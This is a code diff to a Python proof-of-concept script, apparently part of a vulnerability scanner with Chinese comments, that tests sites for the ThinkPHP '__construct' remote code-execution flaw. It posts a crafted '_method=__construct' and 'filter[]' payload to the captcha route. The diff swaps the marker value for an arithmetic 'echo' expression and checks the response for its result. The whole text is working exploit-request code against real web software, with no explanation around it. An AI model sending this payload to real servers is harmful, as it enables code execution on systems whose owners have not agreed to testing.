@@ -18,7 +18,7 @@ vul_info = []
 def thinkphp_construct_code_exec_verify(url):
     global vul_info
     pocdict = {
-        "vulnname":"thinkphp_construct_code_exec",
+        "vulnname":"thinkphp_construct_code_exec代码执行",
         "isvul": False,
         "vulnurl":"",
         "payload":"",
@@ -26,7 +26,7 @@ def thinkphp_construct_code_exec_verify(url):
         "response":"",
         "exception":"",
         "vul_level":"2",#高危
-        "vul_type":"3",#命令执行
+        "vul_type":"4",#代码执行
         "vul_exp_script":"thinkphp_construct_code_exec_exp.py"
     }
     headers = {
@@ -36,18 +36,18 @@ def thinkphp_construct_code_exec_verify(url):
         '_method':'__construct',
         'filter[]':'var_dump',
         'method':'get',
-        'server[REQUEST_METHOD]':'56540676a129760a3',
+        'server[REQUEST_METHOD]':'echo $[13*50123478]',
     }
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=captcha')
         print(vurl)
         req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
-        if r"56540676a129760a3" in req.text:
+        if r"651605214" in req.text:
             pocdict['isvul'] = True
             pocdict['vulnurl'] = vurl
             pocdict['payload'] = payload
-            pocdict['proof'] = '56540676a129760a3'
-            pocdict['response'] = req.text
+            pocdict['proof'] = '651605214'
+            #pocdict['response'] = req.text
             print(pocdict)
             url_info=urlparse(vurl)
             vul_host = url_info.netloc
